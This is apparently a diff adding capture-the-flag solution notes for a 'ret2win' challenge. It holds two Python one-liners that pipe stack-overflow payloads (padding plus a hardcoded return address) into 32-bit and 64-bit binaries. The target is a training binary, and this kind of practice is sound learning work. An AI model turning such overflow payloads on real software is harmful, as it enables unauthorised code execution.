@@ -1,0 +1,7 @@
+
+##32 bit solution
+python -c 'print "A"*40 + "B" * 4 + "\x59\x86\x04\x08"' | ./32/ret2win32 
+
+##64 bit solution:
+python -c 'print "A"*36 + "B" * 4 + "\x11\x08\x40\x00\x00\x00\x00\x00"' | ./ret2win
+
